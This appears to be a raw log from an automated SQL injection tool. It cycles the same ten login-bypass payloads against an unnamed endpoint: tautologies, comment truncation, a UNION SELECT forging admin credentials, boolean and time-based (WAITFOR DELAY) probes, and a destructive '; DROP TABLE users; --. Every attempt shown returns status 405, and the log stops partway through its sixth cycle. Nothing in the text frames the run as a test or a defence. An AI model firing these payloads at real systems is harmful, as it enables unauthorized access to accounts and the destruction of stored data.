2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:36:42 | SQLI_BYPASS | cycle=1 | query=admin' -- | status=405
2026-04-19 16:36:42 | SQLI_BYPASS | cycle=1 | query=admin' # | status=405
2026-04-19 16:36:42 | SQLI_BYPASS | cycle=1 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:42 | SQLI_BYPASS | cycle=1 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=1 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=1 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=1 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=1 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=1 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:43 | SQLI_BYPASS | cycle=2 | query=' OR '1'='1 | status=405
2026-04-19 16:36:44 | SQLI_BYPASS | cycle=2 | query=admin' -- | status=405
2026-04-19 16:36:44 | SQLI_BYPASS | cycle=2 | query=admin' # | status=405
2026-04-19 16:36:44 | SQLI_BYPASS | cycle=2 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:44 | SQLI_BYPASS | cycle=2 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:44 | SQLI_BYPASS | cycle=2 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:45 | SQLI_BYPASS | cycle=2 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:45 | SQLI_BYPASS | cycle=2 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:45 | SQLI_BYPASS | cycle=2 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:45 | SQLI_BYPASS | cycle=2 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:45 | SQLI_BYPASS | cycle=3 | query=' OR '1'='1 | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query=admin' -- | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query=admin' # | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:46 | SQLI_BYPASS | cycle=3 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:47 | SQLI_BYPASS | cycle=3 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:47 | SQLI_BYPASS | cycle=3 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:47 | SQLI_BYPASS | cycle=3 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:47 | SQLI_BYPASS | cycle=4 | query=' OR '1'='1 | status=405
2026-04-19 16:36:47 | SQLI_BYPASS | cycle=4 | query=admin' -- | status=405
2026-04-19 16:36:48 | SQLI_BYPASS | cycle=4 | query=admin' # | status=405
2026-04-19 16:36:48 | SQLI_BYPASS | cycle=4 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:48 | SQLI_BYPASS | cycle=4 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:48 | SQLI_BYPASS | cycle=4 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:48 | SQLI_BYPASS | cycle=4 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=4 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=4 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=4 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=5 | query=' OR '1'='1 | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=5 | query=admin' -- | status=405
2026-04-19 16:36:49 | SQLI_BYPASS | cycle=5 | query=admin' # | status=405
2026-04-19 16:36:50 | SQLI_BYPASS | cycle=5 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:50 | SQLI_BYPASS | cycle=5 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:50 | SQLI_BYPASS | cycle=5 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:36:50 | SQLI_BYPASS | cycle=5 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:36:50 | SQLI_BYPASS | cycle=5 | query=admin' OR 'a'='a | status=405
2026-04-19 16:36:51 | SQLI_BYPASS | cycle=5 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:36:51 | SQLI_BYPASS | cycle=5 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:36:51 | SQLI_BYPASS | cycle=6 | query=' OR '1'='1 | status=405
2026-04-19 16:36:51 | SQLI_BYPASS | cycle=6 | query=admin' -- | status=405
2026-04-19 16:36:51 | SQLI_BYPASS | cycle=6 | query=admin' # | status=405
2026-04-19 16:36:52 | SQLI_BYPASS | cycle=6 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:36:52 | SQLI_BYPASS | cycle=6 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:36:52 | SQLI_BYPASS | cycle=6 | query=admin' AND 1=2 -- | status=405
